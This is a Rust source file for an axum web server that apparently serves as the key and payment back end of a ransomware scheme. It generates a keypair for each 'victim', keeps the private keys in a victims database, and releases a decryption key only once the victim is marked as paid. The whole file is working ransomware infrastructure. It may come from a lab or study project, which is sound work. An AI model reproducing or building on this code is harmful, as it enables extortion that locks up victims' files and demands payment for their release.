mod cryptography;
use axum::{
    extract::{State},
    routing::{get, post},
    Json, Router, http::StatusCode
};
use serde_json::{Value};
use std::{collections::{HashMap, HashSet}, sync::{Arc, Mutex}};

use tokio::net::TcpListener;

use cryptography::key_gen::{generate_keys};
use sodiumoxide::crypto::box_::{PublicKey, SecretKey};

type VictimsDB = Arc<Mutex<HashMap<PublicKey, SecretKey>>>;
type PaidVictims = Arc<Mutex<HashSet<PublicKey>>>;

async fn get_key(
    State((db, paid)): State<(VictimsDB, PaidVictims)>,
    Json(pk): Json<PublicKey>,
) -> Json<Value> {
    println!("Private key requested");
    
    // Check if victim has paid first
    if !paid.lock().unwrap().contains(&pk) {
        println!("Private key requested but the payment is not verified yet!");
        return Json(serde_json::json!({"sk": "", "error": "payment_required"}));
    }
    if let Some(value) = db.lock().unwrap().get(&pk) {
        println!("Private key found and the payment is verified!");
        return Json(serde_json::json!({"sk": value}));
    }

    println!("Private key not found");
    Json(serde_json::json!({"sk": ""}))
}

async fn gen_key(
    State((db, _)): State<(VictimsDB, PaidVictims)>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    let (pk, sk): (PublicKey, SecretKey) = generate_keys().map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let pk_copy = pk.clone();
    db.lock().unwrap().insert(pk, sk);

    println!("New keyset requested");
    return Ok(Json(serde_json::json!({"pk": &pk_copy})));
}
//mark the victim as paid if in the database
async fn mark_paid(
    State((_, paid)): State<(VictimsDB, PaidVictims)>,
    Json(pk): Json<PublicKey>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    paid.lock().unwrap().insert(pk);
    println!("Victim marked as paid!");
    Ok(Json(serde_json::json!({"status": "marked_as_paid"})))
}

//check for the payment status
async fn check_payment(
    State((_, paid)): State<(VictimsDB, PaidVictims)>,
    Json(pk): Json<PublicKey>,
) -> Json<serde_json::Value> {
    let has_paid = paid.lock().unwrap().contains(&pk);
    println!("Payment check for victim: {}", has_paid);
    Json(serde_json::json!({"has_paid": has_paid}))
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let victims: VictimsDB = Arc::new(Mutex::new(HashMap::new()));
    let paid_victims: PaidVictims = Arc::new(Mutex::new(HashSet::new()));
    let state = (victims, paid_victims);

    let app: Router = Router::new()
                        .route("/get-key", post(get_key))
                        .route("/gen-key", get(gen_key))
                        .route("/mark-paid", post(mark_paid))
                        .route("/check-payment", post(check_payment))
                        .with_state(state);

    // create a TCP listener (0.0.0.0:3000)
    // let listener = TcpListener::bind("0.0.0.0:3000")
    let listener = TcpListener::bind("127.0.0.1:3000")
        .await
        .expect("failed to bind");

    // serve the app
    axum::serve(listener, app)
        .await
        .expect("server error");

    println!("Running on port 3000");
    Ok(())
}